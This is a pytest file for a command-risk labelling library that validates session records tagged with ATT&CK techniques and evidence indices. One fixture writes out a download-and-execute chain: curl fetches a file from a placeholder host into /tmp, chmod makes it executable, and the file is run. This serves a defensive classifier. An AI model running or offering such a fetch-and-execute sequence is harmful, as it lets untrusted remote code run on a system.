from __future__ import annotations

import pytest
from pydantic import ValidationError

from cmdrisk.schema import CommandEvent, Label, SessionRecord, SourceInfo
from cmdrisk.taxonomy import attack_stage, tactics_for_techniques


def test_session_accepts_subtechnique_evidence() -> None:
    record = SessionRecord(
        session_id="s1",
        source=SourceInfo(kind="real_malicious", name="fixture", license="MIT"),
        family_id="f1",
        commands=[
            CommandEvent(cmd="curl -o /tmp/a http://example.invalid/a", dt=1.0),
            CommandEvent(cmd="chmod +x /tmp/a"),
            CommandEvent(cmd="/tmp/a", dt=0.2),
        ],
        label=Label(
            malicious=1,
            first_evidence_index=1,
            technique_evidence={"T1105": [0], "T1059.004": [2]},
            tactics=tactics_for_techniques(["T1105", "T1059.004"]),
            techniques=["T1105", "T1059.004"],
            quality="high",
        ),
    )
    assert record.commands[0].dt == 1.0
    assert attack_stage(record.label.tactics) == "Execution"


def test_benign_cannot_have_evidence_index() -> None:
    with pytest.raises(ValidationError):
        Label(malicious=0, first_evidence_index=0, quality="high")


def test_malicious_requires_evidence_index() -> None:
    with pytest.raises(ValidationError):
        Label(malicious=1, quality="high")


def test_evidence_index_is_in_bounds() -> None:
    with pytest.raises(ValidationError):
        SessionRecord(
            session_id="s1",
            source=SourceInfo(kind="real_malicious", name="fixture", license="MIT"),
            family_id="f1",
            commands=[CommandEvent(cmd="whoami")],
            label=Label(
                malicious=1,
                first_evidence_index=1,
                quality="high",
            ),
        )
